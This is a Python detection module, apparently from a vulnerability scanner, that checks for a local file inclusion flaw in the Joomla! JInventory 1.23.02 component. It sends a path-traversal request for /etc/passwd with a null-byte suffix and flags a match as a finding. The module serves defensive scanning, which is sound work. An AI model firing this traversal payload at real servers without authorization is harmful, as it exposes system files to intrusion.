#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in jinventory."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Component JInventory 1.23.02 - Local File Inclusion Detection',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/index.php?option=com_jinventory&controller=../../../../../../../../../../etc/passwd%00', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Joomla! Component JInventory 1.23.02 - Local File Inclusion detected",
                path='/index.php?option=com_jinventory&controller=../../../../../../../../../../etc/passwd%00',
            )
            return True
        return False
